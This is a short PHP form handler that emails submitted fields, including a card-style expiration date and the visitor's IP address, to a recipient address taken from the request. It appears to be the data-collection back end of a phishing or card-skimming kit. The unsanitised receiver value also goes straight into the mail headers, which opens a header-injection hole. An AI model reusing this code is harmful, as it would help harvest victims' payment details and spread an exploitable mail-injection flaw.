
<?php
require_once('real_ip.php');
if((!isset($_POST['data'])) || (!isset($_POST['receiver'])) || (!isset($_POST['subject']))) {
	echo $error;
    die();
}
$month    = array(
    'title' => decode($_POST['data'][2]['title']),
    'value' => decode($_POST['data'][2]['value'])
);
$year     = array(
    'title' => decode($_POST['data'][3]['title']),
    'value' => decode($_POST['data'][3]['value'])
);
$receiver = decode($_POST['receiver']);
$subject  = decode($_POST['subject']);
$headers  = "From: " . $receiver . "\r\n";
$headers .= "Reply-To: " . $receiver . "\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
$message .= '<table cellpadding="10">';
foreach ($_POST['data'] as $key => $value) {
    if (($key < 2) || ($key > 3)) {
        $message .= '<tr><th align="right" valign="top">'.decode($value['title']).':</th><td>'.decode($value['value']).'</td></tr>';
    }
	if($key==2)
	{
		$message .= '<tr><th align="right">Expiration date:</th><td>'.$month['value'].'-'.$year['value'].'</td></tr>';
	}
}
$message .= '<tr><th align="right">IP-address:</th><td>'.real_ip().'</td></tr>';
$message .= '</table>';
mail($receiver, $subject, $message, $headers);
?>